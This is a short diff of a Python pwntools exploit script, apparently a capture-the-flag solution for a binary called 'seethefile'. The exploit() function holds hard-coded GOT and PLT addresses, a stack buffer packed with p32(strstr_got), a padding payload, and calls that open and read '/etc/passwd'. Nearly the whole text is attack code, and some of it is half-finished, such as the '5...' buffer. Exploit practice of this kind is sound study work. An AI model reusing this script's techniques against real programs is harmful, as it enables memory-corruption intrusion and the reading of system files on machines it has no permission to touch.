@@ -48,16 +48,17 @@ def exploit():
 	atoi_plt = 0x080485D0
 	strstr_got = 0x0804B00C
 
-	stack_buf = '5\x00\x00\x00'
-	stack_buf += p32(strstr_got)
+	openfile('/etc/passwd')
 
-	payload = ''
+	stack_buf = '5...'
+
+	payload = 'a' * 0x20
 
 	etc(payload, stack_buf)
 
-    openfile('/etc/passwd')
-    readfile()
-    print writefile()
+	openfile('/etc/passwd')
+	readfile()
+	print writefile()
 
 if debug:
     s = process('./seethefile')
